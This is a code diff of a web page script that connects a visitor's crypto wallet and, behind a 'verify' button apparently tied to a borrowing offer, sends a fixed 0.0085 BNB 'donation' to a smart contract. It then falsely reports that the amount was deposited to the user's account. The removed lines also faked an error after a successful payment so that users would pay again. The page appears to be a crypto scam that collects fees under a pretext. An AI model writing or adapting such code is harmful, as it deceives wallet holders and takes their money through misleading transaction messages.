@@ -545,7 +545,7 @@ align:center;
 
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
- <script>
+  <script>
         const web3 = new Web3(Web3.givenProvider);
         const contractABI = [
 	{
@@ -689,60 +689,65 @@ align:center;
         let walletConnected = false;
         const donationAmount = '0.0085'; // Preset donation amount in BNB
 
-        document.getElementById('connect-wallet').addEventListener('click', async () => {
-            try {
-                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                walletConnected = true;
-const walletAddress = accounts[0];
+document.getElementById('connect-wallet').addEventListener('click', async () => {
+    try {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        walletConnected = true;
+        const walletAddress = accounts[0];
 
-document.getElementById("popup-wallet-address").textContent = walletAddress;
+        document.getElementById("popup-wallet-address").textContent = walletAddress;
 
+        document.getElementById('disconnect-wallet').style.display = 'inline';
+        document.getElementById('connect-wallet').style.display = 'none';
+        document.getElementById('popup-status').textContent = 'Wallet connected';
+    } catch (error) {
+        document.getElementById('popup-status').textContent = 'Error connecting wallet';
+    }
+});
 
-                document.getElementById('disconnect-wallet').style.display = 'inline';
-                document.getElementById('connect-wallet').style.display = 'none';
-                document.getElementById('popup-status').textContent = 'Wallet connected';
-            } catch (error) {
-                document.getElementById('popup-status').textContent = 'Error connecting wallet';
-            }
-        });
+document.getElementById('disconnect-wallet').addEventListener('click', () => {
+    ethereum.send('eth_requestAccounts').then(() => {
+        walletConnected = false;
+        document.getElementById('verify').disabled = true;
+        document.getElementById('connect-wallet').style.display = 'inline';
+        document.getElementById('disconnect-wallet').style.display = 'none';
+        document.getElementById('popup-status').textContent = 'Wallet disconnected';
+    });
+});
 
-        document.getElementById('disconnect-wallet').addEventListener('click', () => {
-            ethereum.send('eth_requestAccounts').then(() => {
-                walletConnected = false;
-                document.getElementById('verify').disabled = true;
-                document.getElementById('connect-wallet').style.display = 'inline';
-                document.getElementById('disconnect-wallet').style.display = 'none';
-                document.getElementById('popup-status').textContent = 'Wallet disconnected';
-            });
-        });
+document.getElementById('verify').addEventListener('click', async () => {
+    if (!walletConnected) {
+        flashNotification('Connect wallet first', 'grey');
+        return;
+    }
 
-	 document.getElementById('verify').addEventListener('click', async () => {
-            
+    const sender = ethereum.selectedAddress;
 
-            // Show the processing popup
- document.getElementById('borrow-popup').style.display = 'none';
-            document.getElementById('popup').style.display = 'flex';
-            document.getElementById('popup-status').textContent = 'Processing Transaction';
-            document.getElementById('popup-message').textContent = 'Please wait while the transaction is being processed...';
+    if (!sender) {
+        flashNotification('Error: No wallet address found', 'red');
+        return;
+    }
 
-            const sender = ethereum.selectedAddress;
+    // Show the processing popup
+    document.getElementById('borrow-popup').style.display = 'none';
+    document.getElementById('popup').style.display = 'flex';
+    document.getElementById('popup-status').textContent = 'Processing Transaction';
+    document.getElementById('popup-message').textContent = 'Please wait while the transaction is being processed...';
 
-            try {
-                const weiAmount = web3.utils.toWei(donationAmount, 'ether'); // Convert preset BNB amount to wei
-                const gas = await contract.methods.verify().estimateGas({ value: weiAmount });
-                await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
+    try {
+        const weiAmount = web3.utils.toWei(donationAmount, 'ether'); // Convert preset BNB amount to wei
+        const gas = await contract.methods.verify().estimateGas({ value: weiAmount });
+        await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
 
-                // Transaction successful	// ✅ Amount Deposited successfully to your account!	//❌ Error: Try using Different Amount
-               document.getElementById('popup-status').textContent = 'Transaction successful';
-                document.getElementById('popup-message').textContent = '✅ Amount Deposited successfully to your account!';
-		    document.getElementById('popup-status').textContent = 'Transaction Problem';
-                document.getElementById('popup-message').textContent = '❌ Error: Try using Different Amount';
-            } catch (error) {
-                // Transaction failed
-                document.getElementById('popup-status').textContent = 'Transaction Failed';
-                document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
-            }
-        });
+        // Transaction successful
+        document.getElementById('popup-status').textContent = 'Transaction Successful';
+        document.getElementById('popup-message').textContent = '✅ Amount Deposited successfully to your account!';
+    } catch (error) {
+        // Transaction failed
+        document.getElementById('popup-status').textContent = 'Transaction Failed';
+        document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
+    }
+});
 
         document.getElementById('close-popup').addEventListener('click', () => {
             document.getElementById('popup').style.display = 'none';
